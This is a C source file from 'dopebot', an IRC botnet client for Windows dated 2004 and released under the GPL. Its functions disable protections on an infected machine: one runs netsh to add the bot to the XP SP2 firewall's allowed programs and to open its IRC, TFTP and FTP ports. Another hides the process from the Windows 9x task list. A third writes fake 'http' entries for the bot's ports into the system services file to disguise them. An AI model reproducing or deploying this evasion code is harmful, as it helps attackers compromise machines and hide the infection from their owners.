/*	dopebot - a modular IRC bot for Win32
	Copyright (C) 2004 dope

	This program is free software; you can redistribute it and/or
	modify it under the terms of the GNU General Public License
	as published by the Free Software Foundation; either version 2
	of the License, or (at your option) any later version.

	This program is distributed in the hope that it will be useful,
	but WITHOUT ANY WARRANTY; without even the implied warranty of
	MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
	GNU General Public License for more details.

	You should have received a copy of the GNU General Public License
	along with this program; if not, write to the Free Software
	Foundation, Inc., 59 Temple Place - Suite 330, Boston, MA  02111-1307, USA. */

#include "bot.h"

#ifndef NO_SP2BYPASS
//Bypass SP2 Firewall
bool bypass_sp2fw()
{
	char szBuffer[LOWBUF], szFilePath[MAX_PATH];
		get_os(szBuffer);
	if (strstr(szBuffer, "Windows XP Service Pack 2") != NULL)
	{

#ifndef NO_DEBUG
		printf("[DEBUG] Bypassing SP2 FW, bypass_sp2fw()\n");
#endif

			GetModuleFileName(GetModuleHandle(NULL), szFilePath, sizeof(szFilePath));
			sprintf(szBuffer, "netsh.exe firewall add allowedprogram %s IRCBOT ENABLE", szFilePath);
			system(szBuffer);
			sprintf(szBuffer, "netsh.exe firewall add portopening TCP %i irc ENABLE ALL", ircport);
			system(szBuffer);
			sprintf(szBuffer, "netsh.exe firewall add portopening UDP %i tftpd ENABLE ALL", tftpdport);
			system(szBuffer);
			sprintf(szBuffer, "netsh.exe firewall add portopening TCP %i tftpd ENABLE ALL", ftpdport);
			system(szBuffer);
			return TRUE;
	}
		return FALSE;
}
#endif

#ifndef NO_9XHIDEPROC
//Hide Process On Windows 9x
bool hideproc()
{
	HINSTANCE hLib;
	typedef DWORD (__stdcall *pRegFunction)(DWORD, DWORD);
	pRegFunction RegisterServiceProcess;
	if (is_osnt()) return FALSE;
	if (!is_os9x()) return FALSE;

#ifndef NO_DEBUG
		printf("[DEBUG] Hiding process from WIN9X tasklist, hideproc()\n");
#endif	

		hLib = LoadLibrary("KERNEL32.dll");
	if (hLib)
	{
			RegisterServiceProcess = (pRegFunction)GetProcAddress(hLib, "RegisterServiceProcess");
        if (RegisterServiceProcess)
		{
				RegisterServiceProcess(GetCurrentProcessId(), 1); //0 == Unregister
				return TRUE;
		}
    }
		return FALSE;
}
#endif

#ifndef NO_REGPORT
//"Register" Bot Port As HTTP Service
bool regport()
{
	HANDLE hFile;
	DWORD r;
	char szSysDir[MAX_PATH];
	char szPath[MAX_PATH];
	char szBuffer[MEDBUF];
	if (is_os9x()) return FALSE;
	if (!is_osnt()) return FALSE;

#ifndef NO_DEBUG
		printf("[DEBUG] Registering port, regport()\n");
#endif

		GetSystemDirectory(szSysDir, sizeof(szSysDir));
		sprintf(szPath, "%s\\drivers\\etc\\services", szSysDir);	
	if (!file_exists(szPath)) return FALSE;
		hFile = CreateFile(szPath, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
		SetFilePointer(hFile, 0, NULL, FILE_END);

#ifndef NO_FTPD
		sprintf(szBuffer, "\r\nhttp             %i/tcp    www www-http           #World Wide Web", ftpdport);
		WriteFile(hFile, szBuffer, strlen(szBuffer), &r, NULL);
#endif

#ifndef NO_TFTPD
		sprintf(szBuffer, "\r\nhttp             %i/tcp    www www-http           #World Wide Web", tftpdport);
		WriteFile(hFile, szBuffer, strlen(szBuffer), &r, NULL);
#endif

#ifndef NO_IDENT
		sprintf(szBuffer, "\r\nhttp             113/tcp   www www-http           #World Wide Web");
		WriteFile(hFile, szBuffer, strlen(szBuffer), &r, NULL);
#endif

		sprintf(szBuffer, "\r\nhttp             %i/tcp    www www-http           #World Wide Web", ircport);
		WriteFile(hFile, szBuffer, strlen(szBuffer), &r, NULL);
	if (r != strlen(szBuffer))
	{
			CloseHandle(hFile);
			return FALSE;
	}
		CloseHandle(hFile);
		return TRUE;
}
#endif
